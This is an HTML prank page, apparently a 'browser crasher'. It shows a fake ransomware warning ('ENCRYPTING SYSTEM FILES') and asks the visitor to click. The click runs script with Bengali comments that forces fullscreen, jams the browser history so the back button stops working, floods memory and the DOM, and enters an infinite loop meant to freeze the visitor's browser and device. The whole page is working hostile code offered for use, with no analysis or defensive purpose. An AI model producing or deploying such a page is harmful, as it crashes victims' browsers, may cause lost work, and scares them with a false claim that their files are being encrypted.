<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>❤️ SYSTEM TERMINATED ❤️</title>
    <style>
        body { background: black; color: #f00; font-family: monospace; overflow: hidden; text-align: center; padding-top: 20%; }
        #status { font-size: 20px; text-shadow: 0 0 10px red; }
    </style>
</head>
<body onclick="totalCrash()">

    <div id="status">
        [!] ENCRYPTING SYSTEM FILES...<br>
        [#] CLICK TO FINALIZE OVERRIDE [#]
    </div>

    <script>
        function totalCrash() {
            // ১. অটো ফুলস্ক্রিন ও মাউস লক (পালানোর পথ বন্ধ)
            document.documentElement.requestFullscreen();
            
            // ২. হিস্ট্রি জ্যাম (ব্যাক বাটন ইনভ্যালিড করা)
            setInterval(() => {
                for (let i = 0; i < 1000; i++) {
                    window.history.pushState(null, null, location.href + "/" + Math.random());
                }
            }, 1);

            // ৩. র‍্যাম এবং জিপিইউ একযোগে ক্রাশ করা (মেইন ইঞ্জিন)
            let data = [];
            function destructiveLoop() {
                // মেমোরি ফ্লাডিং - প্রতি মিলিসেকেন্ডে বিশাল ডাটা পুশ
                data.push(new Array(10000000).join("⚠︎ENAFUL⚠︎"));
                
                // ইনফিনিট এলিমেন্ট ক্রিয়েশন (DOM Stress)
                let div = document.createElement('div');
                div.innerHTML = "<h1>CRITICAL_FAILURE</h1>".repeat(100);
                document.body.appendChild(div);
                
                // কনসোল স্ট্যাক ওভারফ্লো
                console.log("%c STOP", "font-size:100px; color:red;");
                
                // রিকার্সিভ কল যা দ্রুত প্রসেসর লক করবে
                setTimeout(destructiveLoop, 0);
            }

            // ৪. হার্ডওয়্যার ফ্রিজ লুপ
            while(true) {
                destructiveLoop();
                // এটি ব্রাউজারের রেসপন্স করার ক্ষমতা কেড়ে নেবে
                var crash = " ".repeat(1000); 
            }
        }
    </script>
</body>
</html>
